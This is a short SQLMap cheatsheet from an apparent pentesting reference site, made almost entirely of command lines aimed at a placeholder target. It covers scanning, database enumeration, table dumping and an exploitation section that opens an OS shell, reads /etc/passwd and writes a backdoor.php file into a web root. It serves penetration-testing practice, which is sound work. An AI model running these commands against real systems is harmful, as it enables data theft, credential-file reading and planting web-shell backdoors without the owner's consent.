---
title: "SQLMap Cheatsheet"
description: "A comprehensive guide to using SQLMap for SQL injection testing"
date: 2024-10-07T12:00:00+05:45
cheatsheet_categories: ["SQLInjection"]
cheatsheet_tags: ["sqlmap", "sql injection", "pentesting"]
folder: "sqlinjection"
draft: false
weight: 1
---

# SQLMap Cheatsheet

A comprehensive guide to using SQLMap for SQL injection testing.

## Basic Usage

```bash
# Basic scan
sqlmap -u "http://example.com/page.php?id=1"

# Specify a parameter to test
sqlmap -u "http://example.com/page.php?id=1" -p id

# Use a specific HTTP method
sqlmap -u "http://example.com/page.php" --data="id=1" --method POST
```

## Database Enumeration

```bash
# List databases
sqlmap -u "http://example.com/page.php?id=1" --dbs

# List tables in a database
sqlmap -u "http://example.com/page.php?id=1" -D database_name --tables

# List columns in a table
sqlmap -u "http://example.com/page.php?id=1" -D database_name -T table_name --columns

# Dump data from a table
sqlmap -u "http://example.com/page.php?id=1" -D database_name -T table_name --dump
```

## Advanced Options

```bash
# Specify database type
sqlmap -u "http://example.com/page.php?id=1" --dbms=mysql

# Use a proxy
sqlmap -u "http://example.com/page.php?id=1" --proxy=http://127.0.0.1:8080

# Use HTTP Basic Authentication
sqlmap -u "http://example.com/page.php?id=1" --auth-type=basic --auth-cred="username:password"

# Use a cookie
sqlmap -u "http://example.com/page.php?id=1" --cookie="PHPSESSID=1234567890abcdef"
```

## Exploitation

```bash
# Get a shell
sqlmap -u "http://example.com/page.php?id=1" --os-shell

# Read a file
sqlmap -u "http://example.com/page.php?id=1" --file-read="/etc/passwd"

# Write a file
sqlmap -u "http://example.com/page.php?id=1" --file-write="local_file.php" --file-dest="/var/www/html/backdoor.php"
```
